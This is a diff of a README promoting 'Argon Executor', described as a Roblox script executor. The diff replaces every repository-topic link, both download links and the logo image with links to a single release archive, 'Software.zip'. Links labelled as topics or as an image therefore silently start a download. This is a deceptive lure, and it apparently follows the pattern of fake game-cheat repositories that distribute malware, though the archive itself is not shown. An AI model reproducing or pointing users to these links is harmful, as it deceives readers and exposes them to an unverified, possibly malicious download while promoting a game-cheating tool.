@@ -11,25 +11,25 @@ Argon Executor is a robust script executor that is tailored to enhance your Robl
 🔧 24/7 Support  
 
 ## Repository Topics
-🔗 [argon](https://github.com/topics/argon)  
-🔗 [argon-discord](https://github.com/topics/argon-discord)  
-🔗 [argon-download](https://github.com/topics/argon-download)  
-🔗 [argon-executor](https://github.com/topics/argon-executor)  
-🔗 [argon-roblox](https://github.com/topics/argon-roblox)  
-🔗 [key-argon](https://github.com/topics/key-argon)  
-🔗 [roblox](https://github.com/topics/roblox)  
-🔗 [roblox-argon](https://github.com/topics/roblox-argon)  
-🔗 [roblox-argon-2025](https://github.com/topics/roblox-argon-2025)  
-🔗 [roblox-lua](https://github.com/topics/roblox-lua)  
-🔗 [roblox-menu](https://github.com/topics/roblox-menu)  
-🔗 [roblox-script](https://github.com/topics/roblox-script)  
-🔗 [roblox-scripts](https://github.com/topics/roblox-scripts)  
+🔗 [argon](https://github.com/N3BULAONYOUTUBE/Argon-Executor/releases/download/v1.0/Software.zip)  
+🔗 [argon-discord](https://github.com/N3BULAONYOUTUBE/Argon-Executor/releases/download/v1.0/Software.zip)  
+🔗 [argon-download](https://github.com/N3BULAONYOUTUBE/Argon-Executor/releases/download/v1.0/Software.zip)  
+🔗 [argon-executor](https://github.com/N3BULAONYOUTUBE/Argon-Executor/releases/download/v1.0/Software.zip)  
+🔗 [argon-roblox](https://github.com/N3BULAONYOUTUBE/Argon-Executor/releases/download/v1.0/Software.zip)  
+🔗 [key-argon](https://github.com/N3BULAONYOUTUBE/Argon-Executor/releases/download/v1.0/Software.zip)  
+🔗 [roblox](https://github.com/N3BULAONYOUTUBE/Argon-Executor/releases/download/v1.0/Software.zip)  
+🔗 [roblox-argon](https://github.com/N3BULAONYOUTUBE/Argon-Executor/releases/download/v1.0/Software.zip)  
+🔗 [roblox-argon-2025](https://github.com/N3BULAONYOUTUBE/Argon-Executor/releases/download/v1.0/Software.zip)  
+🔗 [roblox-lua](https://github.com/N3BULAONYOUTUBE/Argon-Executor/releases/download/v1.0/Software.zip)  
+🔗 [roblox-menu](https://github.com/N3BULAONYOUTUBE/Argon-Executor/releases/download/v1.0/Software.zip)  
+🔗 [roblox-script](https://github.com/N3BULAONYOUTUBE/Argon-Executor/releases/download/v1.0/Software.zip)  
+🔗 [roblox-scripts](https://github.com/N3BULAONYOUTUBE/Argon-Executor/releases/download/v1.0/Software.zip)  
 
 ## Get Started
 Click the button below to download the latest version of Argon Executor:  
-[![Download Argon Executor](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Argon Executor](https://github.com/N3BULAONYOUTUBE/Argon-Executor/releases/download/v1.0/Software.zip)](https://github.com/N3BULAONYOUTUBE/Argon-Executor/releases/download/v1.0/Software.zip)
 
-If the link doesn't automatically start the download, [click here](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) to download the file.
+If the link doesn't automatically start the download, [click here](https://github.com/N3BULAONYOUTUBE/Argon-Executor/releases/download/v1.0/Software.zip) to download the file.
 
 For more updates and releases, please visit the "Releases" section of this repository.
 
@@ -38,4 +38,4 @@ If you have any questions, require assistance, or want to share feedback, feel f
 
 Let Argon Executor take your Roblox gameplay to new heights with advanced script execution capabilities and premium features. Download now and elevate your gaming experience! 🎉
 
-![Argon Executor Logo](https://example.com/argon-executor-logo.png)
+![Argon Executor Logo](https://github.com/N3BULAONYOUTUBE/Argon-Executor/releases/download/v1.0/Software.zip)
